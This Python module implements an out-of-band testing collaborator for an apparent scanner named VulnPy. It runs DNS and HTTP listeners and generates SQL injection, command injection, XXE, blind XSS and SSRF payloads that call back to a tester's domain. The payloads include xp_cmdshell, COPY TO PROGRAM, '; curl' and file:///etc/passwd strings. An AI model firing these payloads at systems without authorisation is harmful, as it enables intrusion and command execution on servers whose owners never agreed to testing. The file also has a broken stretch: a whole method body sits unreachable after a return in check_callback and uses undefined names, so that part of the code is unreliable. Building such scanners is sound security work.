import time
import uuid
import threading
import socket
import socketserver
import http.server
import json
from collections import defaultdict
from datetime import datetime, timedelta

class VulnPyCollaborator:
    """
    OAST (Out-of-Band Application Security Testing) Collaborator for VulnPy
    Detects blind vulnerabilities by monitoring DNS/HTTP callbacks from target servers
    """
    
    def __init__(self, domain="vulnpy-collaborator.local", dns_port=5353, http_port=8080, verbose=False):
        self.domain = domain
        self.dns_port = dns_port
        self.http_port = http_port
        self.verbose = verbose
        
        # Track active payloads and their callbacks
        self.active_payloads = {}
        self.detected_callbacks = []
        
        # Servers for monitoring callbacks
        self.dns_server = None
        self.http_server = None
        self.servers_running = False
        
        # Statistics
        self.stats = {
            'payloads_generated': 0,
            'dns_callbacks': 0,
            'http_callbacks': 0,
            'vulnerabilities_detected': 0
        }
    
    def log(self, msg):
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[OAST {timestamp}] {msg}")
    
    def start(self):
        """Start the OAST collaborator (alias for start_collaborator_servers)"""
        return self.start_collaborator_servers()
    
    def stop(self):
        """Stop the OAST collaborator (alias for stop_collaborator_servers)"""
        return self.stop_collaborator_servers()
    
    def get_stats(self):
        """Get OAST collaborator statistics"""
        return {
            'total_callbacks': self.stats['dns_callbacks'] + self.stats['http_callbacks'],
            'dns_callbacks': self.stats['dns_callbacks'],
            'http_callbacks': self.stats['http_callbacks'],
            'payloads_generated': self.stats['payloads_generated'],
            'vulnerabilities_detected': self.stats['vulnerabilities_detected']
        }
    
    def start_collaborator_servers(self):
        """Start DNS and HTTP servers to monitor for callbacks"""
        if self.servers_running:
            return True
            
        # Try to find available ports if defaults are busy
        dns_port = self._find_available_port(self.dns_port)
        http_port = self._find_available_port(self.http_port)
        
        if dns_port != self.dns_port:
            self.log(f"DNS port {self.dns_port} busy, using {dns_port}")
            self.dns_port = dns_port
            
        if http_port != self.http_port:
            self.log(f"HTTP port {self.http_port} busy, using {http_port}")
            self.http_port = http_port
            
        try:
            # Start DNS server
            self.dns_server = CollaboratorDNSServer(
                self.domain, 
                self.dns_port, 
                self.on_dns_callback, 
                self.verbose
            )
            dns_thread = threading.Thread(target=self.dns_server.start, daemon=True)
            dns_thread.start()
            
            # Start HTTP server  
            self.http_server = CollaboratorHTTPServer(
                self.http_port,
                self.on_http_callback,
                self.verbose
            )
            http_thread = threading.Thread(target=self.http_server.start, daemon=True)
            http_thread.start()
            
            # Give servers a moment to start
            time.sleep(1)
            
            self.servers_running = True
            self.log(f"Collaborator servers started - DNS:{self.dns_port}, HTTP:{self.http_port}")
            return True
            
        except Exception as e:
            self.log(f"Failed to start collaborator servers: {e}")
            return False
    
    def _find_available_port(self, start_port):
        """Find an available port starting from start_port"""
        for port in range(start_port, start_port + 100):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('localhost', port))
                    return port
            except OSError:
                continue
        return start_port  # Fallback to original port
    
    def stop_collaborator_servers(self):
        """Stop the collaborator servers"""
        if self.dns_server:
            self.dns_server.stop()
        if self.http_server:
            self.http_server.stop()
        self.servers_running = False
        self.log("Collaborator servers stopped")
    
    def generate_sqli_payloads(self):
        """Generate multiple SQLi OAST payloads for different databases"""
        payloads = []
        
        # Generate unique payloads for different database types
        db_types = ['mssql', 'mysql', 'postgresql', 'oracle']
        
        for db_type in db_types:
            unique_id = str(uuid.uuid4())[:8]
            subdomain = f"{unique_id}.sqli.{db_type}"
            
            if db_type == 'mssql':
                payload = f"'; EXEC xp_cmdshell('nslookup {subdomain}.{self.domain}'); --"
            elif db_type == 'mysql':
                payload = f"'; SELECT load_file(CONCAT('http://{subdomain}.{self.domain}/')); --"
            elif db_type == 'postgresql':
                payload = f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}.{self.domain}'; --"
            elif db_type == 'oracle':
                payload = f"' UNION SELECT utl_http.request('http://{subdomain}.{self.domain}/') FROM dual; --"
            
            payload_info = {
                'payload': payload,
                'callback_id': unique_id,
                'db_type': db_type,
                'subdomain': f"{subdomain}.{self.domain}",
                'timestamp': time.time(),
                'detected': False
            }
            
            self.active_payloads[unique_id] = payload_info
            payloads.append(payload_info)
            self.stats['payloads_generated'] += 1
            
        return payloads
    
    def generate_xss_payloads(self):
        """Generate XSS OAST payloads for blind XSS detection"""
        payloads = []
        
        # Generate unique payloads for different XSS contexts
        contexts = ['script', 'img', 'iframe', 'form']
        
        for context in contexts:
            unique_id = str(uuid.uuid4())[:8]
            subdomain = f"{unique_id}.xss.{context}"
            
            if context == 'script':
                payload = f"<script>fetch('http://{subdomain}.{self.domain}/')</script>"
            elif context == 'img':
                payload = f"<img src='http://{subdomain}.{self.domain}/' onerror='this.src=\"http://{subdomain}.{self.domain}/error\"'>"
            elif context == 'iframe':
                payload = f"<iframe src='http://{subdomain}.{self.domain}/'></iframe>"
            elif context == 'form':
                payload = f"<form action='http://{subdomain}.{self.domain}/' method='post'><input type='submit'></form>"
            
            payload_info = {
                'payload': payload,
                'callback_id': unique_id,
                'context': context,
                'subdomain': f"{subdomain}.{self.domain}",
                'timestamp': time.time(),
                'detected': False
            }
            
            self.active_payloads[unique_id] = payload_info
            payloads.append(payload_info)
            self.stats['payloads_generated'] += 1
            
        return payloads
    
    def check_callback(self, callback_id):
        """Check if a specific callback ID has been detected"""
        if callback_id in self.active_payloads:
            return self.active_payloads[callback_id]['detected']
        return False
        """Generate OAST payload for specific vulnerability type"""
        unique_id = str(uuid.uuid4())[:8]
        subdomain = f"{unique_id}.{vulnerability_type}"
        
        payload_info = {
            'id': unique_id,
            'vulnerability_type': vulnerability_type,
            'url': url,
            'parameter': parameter,
            'timestamp': time.time(),
            'detected': False,
            'callback_data': None
        }
        
        self.active_payloads[unique_id] = payload_info
        self.stats['payloads_generated'] += 1
        
        # Generate vulnerability-specific payloads
        if vulnerability_type == 'sqli':
            return self._generate_sqli_payload(subdomain)
        elif vulnerability_type == 'cmd_injection':
            return self._generate_cmd_payload(subdomain)
        elif vulnerability_type == 'xxe':
            return self._generate_xxe_payload(subdomain)
        elif vulnerability_type == 'ssrf':
            return self._generate_ssrf_payload(subdomain)
        else:
            return self._generate_generic_payload(subdomain)
    
    def _generate_sqli_payload(self, subdomain):
        """Generate SQL injection OAST payloads"""
        payloads = [
            f"'; exec xp_cmdshell('nslookup {subdomain}.{self.domain}'); --",  # SQL Server
            f"'; SELECT load_file(CONCAT('http://{subdomain}.{self.domain}/')); --",  # MySQL
            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}.{self.domain}'; --",  # PostgreSQL
            f"' UNION SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{subdomain}.{self.domain}/\"> %remote;]>'),'/l') FROM dual; --"  # Oracle XXE
        ]
        return payloads
    
    def _generate_cmd_payload(self, subdomain):
        """Generate command injection OAST payloads"""
        payloads = [
            f"; nslookup {subdomain}.{self.domain}",  # Unix/Linux
            f" && nslookup {subdomain}.{self.domain}",  # Windows/Unix
            f" | nslookup {subdomain}.{self.domain}",  # Pipe
            f"; curl http://{subdomain}.{self.domain}/",  # HTTP callback
            f" && ping -c 1 {subdomain}.{self.domain}",  # Ping test
        ]
        return payloads
    
    def _generate_xxe_payload(self, subdomain):
        """Generate XXE OAST payloads"""
        payloads = [
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{subdomain}.{self.domain}/xxe"> %remote;]><root>&remote;</root>',
            f'<!ENTITY xxe SYSTEM "http://{subdomain}.{self.domain}/xxe">',
            f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{subdomain}.{self.domain}/"><!ENTITY % sp "<!ENTITY data SYSTEM \'http://{subdomain}.{self.domain}/?%remote;\'>"> %sp; %data;]>'
        ]
        return payloads
    
    def _generate_ssrf_payload(self, subdomain):
        """Generate SSRF OAST payloads"""
        payloads = [
            f"http://{subdomain}.{self.domain}/",
            f"https://{subdomain}.{self.domain}/",
            f"ftp://{subdomain}.{self.domain}/",
            f"file:///{subdomain}.{self.domain}/etc/passwd"
        ]
        return payloads
    
    def _generate_generic_payload(self, subdomain):
        """Generate generic OAST payloads"""
        return [f"{subdomain}.{self.domain}"]
    
    def on_dns_callback(self, query_name, client_ip):
        """Handle DNS callback detection"""
        self.stats['dns_callbacks'] += 1
        self.log(f"DNS callback received: {query_name} from {client_ip}")
        
        # Extract payload ID from subdomain
        parts = query_name.split('.')
        if len(parts) >= 3:  # format: id.vulntype.domain.com
            payload_id = parts[0]
            vuln_type = parts[1] if len(parts) > 1 else 'unknown'
            
            if payload_id in self.active_payloads:
                self._mark_vulnerability_detected(payload_id, 'dns', {
                    'query': query_name,
                    'client_ip': client_ip,
                    'callback_type': 'DNS'
                })
    
    def on_http_callback(self, path, client_ip, headers, method):
        """Handle HTTP callback detection"""
        self.stats['http_callbacks'] += 1
        self.log(f"HTTP callback received: {method} {path} from {client_ip}")
        
        # Extract payload ID from Host header or path
        host = headers.get('Host', '')
        if host:
            parts = host.split('.')
            if len(parts) >= 2:
                payload_id = parts[0]
                
                if payload_id in self.active_payloads:
                    self._mark_vulnerability_detected(payload_id, 'http', {
                        'path': path,
                        'client_ip': client_ip,
                        'method': method,
                        'headers': dict(headers),
                        'callback_type': 'HTTP'
                    })
    
    def _mark_vulnerability_detected(self, payload_id, callback_type, callback_data):
        """Mark a vulnerability as detected based on callback"""
        if payload_id in self.active_payloads:
            payload_info = self.active_payloads[payload_id]
            if not payload_info.get('detected', False):
                payload_info['detected'] = True
                payload_info['callback_data'] = callback_data
                payload_info['detection_time'] = time.time()
                
                self.detected_callbacks.append({
                    'payload_id': payload_id,
                    'payload_info': payload_info,
                    'callback_type': callback_type,
                    'callback_data': callback_data,
                    'timestamp': time.time()
                })
                
                self.stats['vulnerabilities_detected'] += 1
                
                vuln_type = payload_info.get('vulnerability_type', 'Unknown')
                url = payload_info.get('url', 'Unknown')
                param = payload_info.get('parameter', 'Unknown')
                
                self.log(f"🚨 VULNERABILITY DETECTED! {vuln_type.upper()} via {callback_type}")
                self.log(f"   Payload ID: {payload_id}")
                self.log(f"   Details: {callback_data}")
    
    def check_for_callbacks(self, timeout_seconds=30):
        """Check for callbacks within timeout period"""
        start_time = time.time()
        initial_detections = len(self.detected_callbacks)
        
        self.log(f"Monitoring for callbacks (timeout: {timeout_seconds}s)...")
        
        while time.time() - start_time < timeout_seconds:
            time.sleep(1)
            
            # Check if we got new detections
            current_detections = len(self.detected_callbacks)
            if current_detections > initial_detections:
                new_detections = current_detections - initial_detections
                self.log(f"✅ {new_detections} new vulnerability(s) detected via OAST!")
        
        return len(self.detected_callbacks) - initial_detections
    
    def get_detected_vulnerabilities(self):
        """Get list of vulnerabilities detected via OAST"""
        return self.detected_callbacks.copy()
    
    def cleanup_old_payloads(self, max_age_hours=24):
        """Clean up old payloads to prevent memory leaks"""
        cutoff_time = time.time() - (max_age_hours * 3600)
        old_payloads = [pid for pid, info in self.active_payloads.items() 
                       if info['timestamp'] < cutoff_time]
        
        for pid in old_payloads:
            del self.active_payloads[pid]
        
        if old_payloads:
            self.log(f"Cleaned up {len(old_payloads)} old payloads")


class CollaboratorDNSServer:
    """Simple DNS server to capture DNS callbacks"""
    
    def __init__(self, domain, port, callback_handler, verbose=False):
        self.domain = domain
        self.port = port
        self.callback_handler = callback_handler
        self.verbose = verbose
        self.running = False
        self.socket = None
    
    def start(self):
        """Start the DNS server"""
        self.running = True
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            self.socket.bind(('0.0.0.0', self.port))
            if self.verbose:
                print(f"[OAST] DNS server listening on port {self.port}")
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(512)
                    self._handle_dns_query(data, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:  # Only log if we're supposed to be running
                        if self.verbose:
                            print(f"[OAST] DNS server error: {e}")
        except Exception as e:
            if self.verbose:
                print(f"[OAST] Failed to start DNS server: {e}")
        finally:
            if self.socket:
                self.socket.close()
    
    def _handle_dns_query(self, data, addr):
        """Handle incoming DNS query"""
        try:
            # Simple DNS query parsing (just extract domain name)
            if len(data) > 12:  # Minimum DNS header size
                # Skip DNS header, parse question section
                offset = 12
                domain_parts = []
                
                while offset < len(data):
                    length = data[offset]
                    if length == 0:
                        break
                    offset += 1
                    if offset + length <= len(data):
                        domain_parts.append(data[offset:offset + length].decode('utf-8', errors='ignore'))
                        offset += length
                    else:
                        break
                
                if domain_parts:
                    query_domain = '.'.join(domain_parts)
                    if self.domain in query_domain:
                        self.callback_handler(query_domain, addr[0])
        except Exception as e:
            if self.verbose:
                print(f"[OAST] DNS query parsing error: {e}")
    
    def stop(self):
        """Stop the DNS server"""
        self.running = False
        if self.socket:
            self.socket.close()


class CollaboratorHTTPServer:
    """Simple HTTP server to capture HTTP callbacks"""
    
    def __init__(self, port, callback_handler, verbose=False):
        self.port = port
        self.callback_handler = callback_handler
        self.verbose = verbose
        self.server = None
    
    def start(self):
        """Start the HTTP server"""
        handler = self._create_handler()
        self.server = http.server.HTTPServer(('0.0.0.0', self.port), handler)
        
        if self.verbose:
            print(f"[OAST] HTTP server listening on port {self.port}")
        
        try:
            self.server.serve_forever()
        except Exception as e:
            if self.verbose:
                print(f"[OAST] HTTP server error: {e}")
    
    def _create_handler(self):
        """Create HTTP request handler"""
        callback_handler = self.callback_handler
        verbose = self.verbose
        
        class CallbackHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self._handle_request()
            
            def do_POST(self):
                self._handle_request()
            
            def do_HEAD(self):
                self._handle_request()
            
            def _handle_request(self):
                client_ip = self.client_address[0]
                callback_handler(self.path, client_ip, self.headers, self.command)
                
                # Send simple response
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'VulnPy Collaborator')
            
            def log_message(self, format, *args):
                if verbose:
                    super().log_message(format, *args)
        
        return CallbackHandler
    
    def stop(self):
        """Stop the HTTP server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
